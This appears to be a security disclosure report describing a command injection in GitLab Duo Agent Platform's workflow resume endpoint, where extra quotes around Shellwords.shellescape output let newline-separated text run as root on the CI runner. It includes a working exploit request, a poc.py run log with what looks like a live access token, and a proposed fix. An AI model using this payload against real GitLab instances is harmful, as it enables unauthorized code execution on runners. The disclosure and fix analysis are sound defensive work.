# Summary-1

I successfully reproduced an RCE that can be triggered within GitLab. However, during my investigation, I confirmed that the affected functionality is only available in GitLab Ultimate.

Although I was able to obtain a trial license, I discovered that the following endpoints were not accessible in that environment:

* `/api/v4/ai/duo_workflows/workflows`
* `/api/v4/ai/duo_workflows/workflows/{id}/resume`

To continue my research, I deployed a local GitLab instance and made several minimal modifications solely to enable access to the feature under test:
- `ee/lib/ai/duo_workflow/duo_workflow_service/client.rb`
- Stubbed `generate_token`
- `ee/lib/api/ai/duo_workflows/workflows.rb`
- Removed the `find_workflow!` 403 restriction and rewrote the `/resume` path accordingly
- `ee/app/services/ai/duo_workflows/start_workflow_service.rb`
- Bypassed `execute_duo_workflow_in_ci` and added a service-account fallback

I would like to emphasize that these changes were made only to enable usage of the feature in my local environment. They do not alter the underlying workflow, execution path, or the root cause of the vulnerability. The objective was simply to reproduce and validate the issue in a self-hosted setup.

I hope you can understand this limitation of the testing environment.

> That said, I believe your team should be able to reproduce the issue directly in an environment where the feature is available, without requiring any of the modifications described above. I also considered purchasing a subscription to reproduce it in an unmodified environment, but I found that the relevant plan is only offered through annual billing rather than a monthly subscription. With that context out of the way

I will now proceed with the details of the vulnerability.

# Summary-2
GitLab Duo Agent Platform builds the `duo run` CLI command line for a workflow by string-concatenation. When a paused workflow is resumed with a rejection, `Ai::DuoWorkflows::ResumeWorkflowService#executor_cli_command` appends `--rejection-reason '<msg>'`, where `<msg>` is `Shellwords.shellescape(@params[:human_message])` wrapped in an *additional* hand-written pair of single quotes. `Shellwords.shellescape` already returns a complete, shell-safe token and represents a newline by closing and reopening the quote, so the extra surrounding quotes desynchronise the quoting whenever `human_message` contains a newline. Attacker text after the newline then lands outside any quoting and is parsed by the shell as a separate command. That assembled string is interpolated raw into the CI job script (`Gitlab::DuoWorkflow::Sandbox#wrap_command`) and submitted as a CI workload, so the injected command runs on the GitLab Runner as root. An authenticated user who owns a resumable Duo workflow can therefore achieve arbitrary command execution on the runner.

# Details

```ruby
# frozen_string_literal: true

module Ai
  module DuoWorkflows
    class ResumeWorkflowService < StartWorkflowService
      private

      def variables
        # Preserve job variables from initial workload; refresh only token variables
        previous_vars = previous_workload_variables
        return super if previous_vars.empty?

        previous_vars.merge(token_variables)
      end

      def executor_cli_command
        cmd = super + %( --approval #{@params[:human_approval]})
        if @params[:human_message].present?
          cmd += %( --rejection-reason '#{Shellwords.shellescape(@params[:human_message])}') <- here
        end

        cmd
      end

      def previous_workload_variables
        build = @workflow.last_workload&.pipeline&.builds&.first
        return {} unless build

        build.yaml_variables.to_h { |v| [v[:key].to_sym, v[:value]] }
      end
    end
  end
end
# https://gitlab.com/gitlab-org/gitlab/-/blob/master/ee/app/services/ai/duo_workflows/resume_workflow_service.rb?ref_type=heads#L19
```
`Shellwords.shellescape` (alias `Shellwords.escape`) turns an arbitrary string
into **one** token that a POSIX shell will read back as the original bytes. Its
rules (see Ruby's `lib/shellwords.rb`) are, roughly:

- an empty string → `''`
- every byte in the "safe" set `[A-Za-z0-9_\-.,:+/@\n]`-ish is passed through...
  - ...**except** the newline, which is special: it is emitted as a **literal
    single-quoted newline**, i.e. the three bytes `'`, `\n`, `'`
- every other byte (space, `;`, `|`, `&`, `'`, `(`, ...) is **backslash-escaped**

The key, easily-missed fact: **`shellescape` does not wrap its whole output in
quotes.** It escapes byte-by-byte and only introduces quotes around the newline.
So its output is already a finished, balanced token. Anyone who then wraps it in
*more* quotes is double-quoting.

## Step 1: escape our payload

Take the attacker input:

```
human_message = "a\n/usr/bin/id\n"        # bytes:  a  LF  / u s r / b i n / i d  LF
```

Apply the rules byte by byte:

| input byte(s) | rule | output |
|---|---|---|
| `a`            | safe | `a` |
| `\n`           | **newline → `'\n'`** | `'\n'` |
| `/usr/bin/id`  | all safe | `/usr/bin/id` |
| `\n`           | **newline → `'\n'`** | `'\n'` |

Concatenated (`\n` = a literal newline byte):

```
shellescape("a\n/usr/bin/id\n")  ==  a'\n'/usr/bin/id'\n'
```

Read on its own this is a perfectly valid single token: `a` + (quoted newline) + `/usr/bin/id` + (quoted newline). If you `echo` it you get back exactly `a\n/usr/bin/id\n`. So far, safe.

## Step 2: the vulnerable code adds another quote pair

`resume_workflow_service.rb:19` builds the argument as `'#{shellescape(...)}'`, literal `'` + the token above + literal `'`:

```
--rejection-reason 'a'\n'/usr/bin/id'\n''
```

Let me annotate every quote so the pairing is obvious (Q = a `'` byte, numbered in source order):

```
--rejection-reason  Q1 a Q2 \n Q3 /usr/bin/id Q4 \n Q5 Q6
                    └──┘     └─────────────┘     └──┘
                   source    │  shellescape-   │  source-literal close
                   -literal  │  generated pair │  + stray quote
                   open      └ shellescape gen └ shellescape gen
```

- `Q1`, `Q6` are **source-literal quotes**, the two `'` characters the developer
  typed by hand in `'#{shellescape(...)}'` at line 19. They are fixed in the code.
- `Q2`,`Q3` are **shellescape-generated** quotes wrapping the *first* newline.
- `Q4`,`Q5` are **shellescape-generated** quotes wrapping the *second* newline.

The developer's mental model was "`Q1` opens, `Q6` closes, everything between is one quoted argument." But the shell pairs single quotes **left-to-right, greedily**: `Q1↔Q2`, then `Q3↔Q4`, then `Q5↔Q6`. Every quote is paired one position earlier than intended, an **off-by-one** caused by injecting our own `shellescape`-generated quotes (`Q2`–`Q5`) into the middle. The consequence:

## Step 3: tokenize as the shell sees it

A single-quoted region is literal text; a newline that is **not** inside quotes is a **command separator**. Resolving the pairs above:

```
  'a'        → quoted literal  a          (still part of the duo-run command line)
  \n          → OUTSIDE quotes  → COMMAND SEPARATOR
  '/usr/bin/id'   → quoted literal  /usr/bin/id   (start of a NEW command)
  \n          → OUTSIDE quotes  → COMMAND SEPARATOR
  ''         → empty token                (a third, empty command)
```

So the one intended command becomes **three logical lines**:

| # | line | meaning |
|---|---|---|
| 1 | `duo run ... --approval false --rejection-reason 'a'` | the real invocation; rejection reason = `a` |
| 2 | `/usr/bin/id` | **a brand-new command** the shell runs on its own |
| 3 | *(empty)* | empty command (the stray `''`) |

Line 2 is the injection: `Q3` (an *inner* quote meant to re-open after the newline) got consumed by `Q2`'s closing, and `Q1`'s partner ended up being `Q2` instead of `Q6`. Every quote after that shifts by one, leaving `/usr/bin/id` sitting bare between two unquoted newlines. The trailing `Q5 Q6` (`''`) is the leftover empty command, it's the `: command not found` you see at the end of the real trace.

## Why no metacharacters survive (the primitive's shape)

Notice line 2 is exactly `/usr/bin/id` and nothing else. If the payload were `id; echo x`, the `;` and spaces are **backslash-escaped by Step 0**, and then the *whole* thing is still wrapped by the outer quotes, so the shell reads the literal token `id\;\ echo\ x` as a single **command name** → `command not found`. The injection therefore yields **one bare, argument-less command per injected newline**, see §3 for how that is still full RCE.

## Data-flow chain

```
POST /api/v4/ai/duo_workflows/workflows/{id}/resume   (human_message)
  → Ai::DuoWorkflows::ResumeWorkflowService#executor_cli_command   resume_workflow_service.rb:19  [tainted token, broken quoting]
  → Ai::DuoWorkflows::StartWorkflowService#set_up_executor_commands start_workflow_service.rb:273
  → Gitlab::DuoWorkflow::Sandbox#wrap_command                       sandbox.rb:34/36/40/45        [raw interpolation into CI script]
  → Ci::Workloads::RunWorkloadService                               (submits CI workload)
  → GitLab Runner executes the job                                  [RCE]
```
## Exploit primitive and its constraints
The injection runs commands, but with a precise shape worth documenting:

- `shellescape` backslash-escapes spaces, `;`, `|`, `&`, etc. Combined with the re-wrapping, **each newline-delimited line executes as a single, bare, argument-less token**.
- Therefore `\na\n/usr/bin/id\n` → `/usr/bin/id` runs cleanly.
- But `\nid; echo x\n` → shellescape produces `id\;\ echo\ x`, which the outer single quotes turn into the literal token `id\;\ echo\ x` → `command not found` (no command separation, no arguments).

**Usable payloads** are bare executable paths, one per injected newline:

```
human_message = "a\n/usr/bin/id\n/usr/bin/whoami\n"
```

For multi-step / argument-bearing payloads, drop a script into the writable workspace (the sandbox allows write to `./` and `/tmp`) using an earlier step or the agent itself, then inject its bare path. The constraint limits *convenience*, not *capability*, arbitrary code still runs as root.

# Steps to reproduce

```text
POST /api/v4/ai/duo_workflows/workflows/1/resume HTTP/1.1
Host: gitlab.local.test:31666
PRIVATE-TOKEN: <PAT of workflow owner>
Content-Type: application/json

{"human_approval": false, "human_message": "a\n/usr/bin/id\n"}
```

Response: `HTTP 201`, with a CI workload id. A pipeline with `source = duo_workflow` is created on a `refs/workloads/<sha>` branch and dispatched to the runner.

### Observed CI job trace (decisive lines)

```
$ echo "SRT sandbox test successful, running command: duo run ... --rejection-reason 'a' # collapsed multi-line command
SRT sandbox test successful, running command: duo run ... --rejection-reason 'a'
'/usr/bin/id'
''

uid=0(root) gid=0(root) groups=0(root)              ← injected /usr/bin/id executed as root
/usr/bin/bash: line 245: : command not found        ← trailing empty ('') command
```
{F6039987}

Crucially, the Duo CLI's own debug log in the *same* trace shows:

```json
"command": { "approval": "rejected", "rejectionReason": "a", ... }
"toolApproval": { "userApproved": false, "message": "a" }
```

i.e. the CLI only ever received `a` as the rejection reason. `/usr/bin/id` never reached the program as an argument, it executed in the job shell. That gap *is* the injection.

A driver that performs the request and asserts the `uid=` evidence in the trace is provided in poc.py

# What is the current *bug* behavior?

`human_message` content placed after a newline is executed as a separate shell command on the CI runner, instead of being passed as the literal value of the `--rejection-reason` argument to `duo run`. The injected command runs as root in the workload container.

# What is the expected *correct* behavior?

`human_message` must be delivered to `duo run` as a single, literal argument value regardless of its contents, and it must never be able to introduce a new command. `Shellwords.shellescape` already produces a safe standalone token, so it must be used without the surrounding hand-written quotes:

```ruby
# vulnerable
cmd += %( --rejection-reason '#{Shellwords.shellescape(@params[:human_message])}')
# fixed
cmd += %( --rejection-reason #{Shellwords.shellescape(@params[:human_message])})
```

As defense in depth, the executor command should be built as an argument vector rather than a single interpolated shell string, and `Sandbox#wrap_command` should treat `command` as data (write-to-file-and-invoke, or escape the whole token list at the interpolation point) instead of splicing a pre-built string into `%(... #{command})` lines. After the fix, the PoC request must run only `duo run` with `rejectionReason = "a\n/usr/bin/id\n"` as a literal multi-line argument, and no `uid=0(root)` line may appear in the job trace.


### Relevant logs and/or screenshots

```shell
python3 poc.py --base http://wsl.evm.pics:31666/ --token glpat-DvlfTBJW1PaYtSiO3GhEOFlv6VPLMBbK
[*] workflow id = 3
[*] injecting (newline-split tokens): ['/usr/bin/id']
[*] resume -> HTTP 201
[*] new CI job id = 9  (was 8)
    poll 1: created
    poll 2: running
    poll 3: running
    poll 4: running
    poll 5: failed

[*] trace evidence:
    2026-06-04T16:29:53.879607Z 01O $ echo "SRT sandbox test successful, running command: duo run --existing-session-id 3 --connection-type websocket --approval false --rejection-reason 'a' # collapsed multi-line command
    2026-06-04T16:29:53.879612Z 01O SRT sandbox test successful, running command: duo run --existing-session-id 3 --connection-type websocket --approval false --rejection-reason 'a'
    2026-06-04T16:29:53.879614Z 01O $ unshare -m env -i DUO_WORKFLOW_ADDITIONAL_CONTEXT_CONTENT="$DUO_WORKFLOW_ADDITIONAL_CONTEXT_CONTENT" DUO_WORKFLOW_BASE_PATH="$DUO_WORKFLOW_BASE_PATH" DUO_WORKFLOW_DEFINITION="$DUO_WORKFLOW_DEFINITION" DUO_WORKFLOW_FLOW_CONFIG="$DUO_WORKFLOW_FLOW_CONFIG" DUO_WORKFLOW_FLOW_CONFIG_ID="$DUO_WORKFLOW_FLOW_CONFIG_ID" DUO_WORKFLOW_FLOW_CONFIG_SCHEMA_VERSION="$DUO_WORKFLOW_FLOW_CONFIG_SCHEMA_VERSION" DUO_WORKFLOW_FLOW_VERSION="$DUO_WORKFLOW_FLOW_VERSION" DUO_WORKFLOW_GOAL="$DUO_WORKFLOW_GOAL" DUO_WORKFLOW_SOURCE_BRANCH="$DUO_WORKFLOW_SOURCE_BRANCH" DUO_WORKFLOW_WORKFLOW_ID="$DUO_WORKFLOW_WORKFLOW_ID" DUO_WORKFLOW_SERVICE_SERVER="$DUO_WORKFLOW_SERVICE_SERVER" DUO_WORKFLOW_SERVICE_REALM="$DUO_WORKFLOW_SERVICE_REALM" DUO_WORKFLOW_GLOBAL_USER_ID="$DUO_WORKFLOW_GLOBAL_USER_ID" DUO_WORKFLOW_INSTANCE_ID="$DUO_WORKFLOW_INSTANCE_ID" DUO_WORKFLOW_INSECURE="$DUO_WORKFLOW_INSECURE" DUO_WORKFLOW_DEBUG="$DUO_WORKFLOW_DEBUG" LOG_LEVEL="$LOG_LEVEL" DUO_WORKFLOW_GIT_HTTP_BASE_URL="$DUO_WORKFLOW_GIT_HTTP_BASE_URL" DUO_WORKFLOW_GIT_HTTP_USER="$DUO_WORKFLOW_GIT_HTTP_USER" DUO_WORKFLOW_GIT_USER_EMAIL="$DUO_WORKFLOW_GIT_USER_EMAIL" DUO_WORKFLOW_GIT_USER_NAME="$DUO_WORKFLOW_GIT_USER_NAME" DUO_WORKFLOW_GIT_AUTHOR_EMAIL="$DUO_WORKFLOW_GIT_AUTHOR_EMAIL" DUO_WORKFLOW_GIT_AUTHOR_USER_NAME="$DUO_WORKFLOW_GIT_AUTHOR_USER_NAME" DUO_WORKFLOW_METADATA="$DUO_WORKFLOW_METADATA" DUO_WORKFLOW_PROJECT_ID="$DUO_WORKFLOW_PROJECT_ID" DUO_WORKFLOW_NAMESPACE_ID="$DUO_WORKFLOW_NAMESPACE_ID" GITLAB_BASE_URL="$GITLAB_BASE_URL" GITLAB_PROJECT_PATH="$GITLAB_PROJECT_PATH" AGENT_PLATFORM_GITLAB_VERSION="$AGENT_PLATFORM_GITLAB_VERSION" AGENT_PLATFORM_MODEL_METADATA="$AGENT_PLATFORM_MODEL_METADATA" AGENT_PLATFORM_FEATURE_SETTING_NAME="$AGENT_PLATFORM_FEATURE_SETTING_NAME" GITLAB_ENABLE_GLOBAL_SKILLS="$GITLAB_ENABLE_GLOBAL_SKILLS" GIT_TERMINAL_PROMPT="$GIT_TERMINAL_PROMPT" GIT_CONFIG_NOSYSTEM="$GIT_CONFIG_NOSYSTEM" GIT_CONFIG_GLOBAL="$GIT_CONFIG_GLOBAL" GIT_AUTHOR_NAME="$GIT_AUTHOR_NAME" GIT_AUTHOR_EMAIL="$GIT_AUTHOR_EMAIL" GIT_COMMITTER_NAME="$GIT_COMMITTER_NAME" GIT_COMMITTER_EMAIL="$GIT_COMMITTER_EMAIL" GIT_CONFIG_COUNT="$GIT_CONFIG_COUNT" GIT_CONFIG_KEY_0="$GIT_CONFIG_KEY_0" GIT_CONFIG_VALUE_0="$GIT_CONFIG_VALUE_0" GIT_CONFIG_KEY_1="$GIT_CONFIG_KEY_1" GIT_CONFIG_VALUE_1="$GIT_CONFIG_VALUE_1" GITLAB_OAUTH_TOKEN="$GITLAB_OAUTH_TOKEN" DUO_WORKFLOW_SERVICE_TOKEN="$DUO_WORKFLOW_SERVICE_TOKEN" DUO_WORKFLOW_GIT_HTTP_PASSWORD="$DUO_WORKFLOW_GIT_HTTP_PASSWORD" GITLAB_TOKEN="$GITLAB_TOKEN" GIT_PASSWORD="$GIT_PASSWORD" NPM_CONFIG_CACHE="$NPM_CONFIG_CACHE" GITLAB_LSP_STORAGE_DIR="$GITLAB_LSP_STORAGE_DIR" TMPDIR="$TMPDIR" PATH="$PATH" GITLAB_WORKFLOW_SANDBOX="$GITLAB_WORKFLOW_SANDBOX" srt --settings /opt/.gitlab-sandbox/srt-settings.json duo run --existing-session-id 3 --connection-type websocket --approval false --rejection-reason 'a' # collapsed multi-line command
    2026-06-04T16:29:56.787231Z 01O uid=0(root) gid=0(root) groups=0(root)
    2026-06-04T16:29:56.787382Z 01E /usr/bin/bash: line 245: : command not found

[*] job log: http://wsl.evm.pics:31666/<group>/<project>/-/jobs/9
RESULT: PASS: injected command executed on the CI runner (RCE)
```

# Results of GitLab environment info

```
GitLab version: 19.0.1-ee (revision 52e5d1bf910), Enterprise Edition
```

## Impact

- **Arbitrary command execution as root** in the Duo workload container on the CI runner that services Duo Agent Platform jobs.
